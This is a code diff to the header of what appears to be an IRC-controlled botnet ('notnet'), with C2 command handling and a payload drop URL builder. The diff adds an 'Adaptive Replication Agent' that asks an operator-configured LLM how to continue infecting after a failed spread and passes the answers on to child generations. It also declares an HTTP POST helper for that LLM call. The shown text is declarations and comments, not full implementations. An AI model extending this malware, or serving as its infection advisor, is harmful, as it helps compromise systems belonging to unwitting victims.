@@ -6,6 +6,7 @@
 #define NOTNET_PROTOCOL_H
 
 #include "config.h"
+#include "ara.h"
 #include <time.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
@@ -368,7 +369,26 @@ typedef struct {
     /* SECURITY FIX (#14): Rate limiting for C2 commands */
     time_t last_cmd_time;
     int cmd_this_second;
+
+    /* ── Adaptive Replication Agent (#401) ───────────────────── */
+    /* LLM-directed infection brain. All fields default to
+     * disabled/empty; with ara_enabled=0 the module never runs and no
+     * notes ride the drop URL. See include/ara.h. The operator sets
+     * ara_llm_url / ara_llm_model / ara_llm_key plus the two prompt
+     * templates; the notes directory (ara_notes_dir=) holds the
+     * Lamarckian notes file. */
+    ara_llm_t ara;
+    char ara_notes_dir[128];   /* where ara-notes.conf lives */
 } notnet_bot_t;
+
+/* #401: ARA adapt call (declared here — needs the complete bot type).
+ * Asks the operator-configured LLM how to proceed after a failed
+ * spread on target/arch and absorbs the answer as child-generation
+ * notes. Returns 0 on success, -1 on any failure (disabled, bad url,
+ * network, non-2xx, unparseable reply). Never blocks longer than the
+ * underlying HTTP timeout. */
+int ara_adapt(notnet_bot_t *bot, const ara_llm_t *llm,
+              const char *target, const char *arch, const char *error);
 
 /* ── IRC Functions ──────────────────────────────────────────── */
 int irc_connect(notnet_bot_t *bot);
@@ -400,6 +420,13 @@ int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len);
 int http_get_url_json(notnet_bot_t *bot, const char *url, char *buf, int len);
 /* #190: drop URL builder — one-time download token with ?secret= fallback. */
 int build_drop_url(notnet_bot_t *bot, char *dl_url, size_t sz);
+/* #401: one-shot POST of a JSON body to an arbitrary http(s) URL and
+ * read the response (used by the ARA LLM call). Dials the URL directly
+ * like http_get_url; never sends the fleet secret to a foreign host —
+ * only an operator-supplied bearer key. Returns the response length
+ * (>0), -1 on failure. */
+int http_post_to_url(notnet_bot_t *bot, const char *url, const char *bearer,
+                     const char *body, char *resp, size_t resp_sz);
 int http_read(notnet_bot_t *bot, char *buf, int len);
 /* #293: size-capped download. Aborts mid-stream (and unlinks dest) once
  * more than max_bytes would be written — callers fetching untrusted
